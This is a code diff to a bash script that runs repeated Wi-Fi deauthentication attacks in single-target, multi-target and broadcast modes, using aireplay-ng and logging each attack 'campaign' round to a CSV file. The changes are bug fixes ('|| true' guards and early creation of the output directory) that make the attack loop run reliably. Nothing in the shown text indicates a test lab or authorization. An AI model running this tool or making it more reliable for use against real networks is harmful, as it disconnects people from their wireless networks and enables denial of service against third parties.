@@ -219,7 +219,7 @@ mode_single() {
 
         wait $deauth_pid 2>/dev/null || true
 
-        ((attack_counts["$target_bssid"]++))
+        ((attack_counts["$target_bssid"]++)) || true
 
         # Log to CSV
         echo "$(date -Iseconds),${target_bssid},${round},${PACKETS_PER_ROUND},SUCCESS" >> "${STATS_FILE}"
@@ -236,7 +236,7 @@ mode_single() {
             sleep "$sleep_time"
         fi
 
-        ((round++))
+        ((round++)) || true
     done
 }
 
@@ -293,7 +293,7 @@ mode_multi() {
             # Execute deauth
             aireplay-ng -0 "${PACKETS_PER_ROUND}" -a "$bssid" "${INTERFACE}" >/dev/null 2>&1 || true
 
-            ((attack_counts["$bssid"]++))
+            ((attack_counts["$bssid"]++)) || true
 
             # Log to CSV
             echo "$(date -Iseconds),${bssid},${essid},${round},${PACKETS_PER_ROUND},SUCCESS" >> "${STATS_FILE}"
@@ -307,7 +307,7 @@ mode_multi() {
         echo -e "${YELLOW}Round ${round} completed. Waiting ${INTERVAL}s...${NC}"
         sleep "$INTERVAL"
 
-        ((round++))
+        ((round++)) || true
     done
 }
 
@@ -347,7 +347,7 @@ mode_broadcast() {
         echo -e "${YELLOW}  Waiting ${INTERVAL}s...${NC}\n"
 
         sleep "$INTERVAL"
-        ((round++))
+        ((round++)) || true
     done
 }
 
@@ -432,6 +432,9 @@ cleanup() {
 ################################################################################
 main() {
     print_banner
+
+    # Create output directory first (before any logging)
+    mkdir -p "${OUTPUT_DIR}"
 
     echo -e "${BLUE}Campaign Configuration:${NC}"
     echo -e "  Mode:          ${MODE}"
